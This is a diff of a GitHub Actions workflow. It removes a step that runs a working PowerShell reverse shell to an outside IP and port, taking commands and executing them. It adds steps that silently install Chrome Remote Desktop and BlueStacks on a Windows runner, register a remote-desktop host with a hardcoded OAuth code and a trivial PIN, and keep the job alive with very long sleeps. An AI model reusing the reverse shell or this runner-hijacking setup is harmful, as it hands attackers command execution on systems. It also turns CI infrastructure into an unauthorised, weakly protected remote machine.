@@ -1,30 +1,41 @@
-name: Reverse Shell Test
+name: test error
 
 on:
-  workflow_dispatch:
+  workflow_dispatch: # Vẫn cho phép chạy thủ công
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/**
 
 jobs:
-  shell-test:
+  setup-chrome-rd:
     runs-on: windows-latest
-
     steps:
-      - name: Reverse shell using PowerShell
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: 1 
         run: |
-          $client = New-Object System.Net.Sockets.TCPClient('147.185.221.30',34011)
-          $stream = $client.GetStream()
-          [byte[]]$bytes = 0..65535|%{0}
-          while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-            try {
-              $sendback = (Invoke-Expression $data 2>&1 | Out-String )
-            } catch {
-              $sendback = $_.Exception.Message
-            }
-            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()
-          }
-      - name: 123
+          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "chrome_setup.exe"
+          Start-Process "chrome_setup.exe" -ArgumentList "/silent /install" -Wait
+
+      - name: 2 
         run: |
-          sleep 20000
+          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "chrome_remote_desktop_host.msi"
+          Start-Process "msiexec.exe" -ArgumentList "/i", "chrome_remote_desktop_host.msi", "/quiet" -Wait
+
+      - name: 2.5 
+        run: |
+          Invoke-WebRequest -Uri "https://cdn.bluestacks.com/BlueStacksFullInstaller_5.22.91.1029_amd64_native.exe" -OutFile "BlueStacksFullInstaller_5.22.91.1029_amd64_native.exe"
+          Start-Process "BlueStacksFullInstaller_5.22.91.1029_amd64_native.exe" -ArgumentList "--defaultImageName", "Nougat64", "--imageToLaunch", "Nougat64" -Wait
+
+      - name: 3 
+        run: |
+          & "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AVMBsJhdiel5hN9-YuJkgFv3MtW7KsKwuefSyv_guyvdt-7SmX3u_K0LKuRmpO-PNOV90Q" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME --pin=111111
+
+      - name: Wait
+        run: Start-Sleep -Seconds 2147483
+
+      - name: Wait2
+        run: Start-Sleep -Seconds 2147483
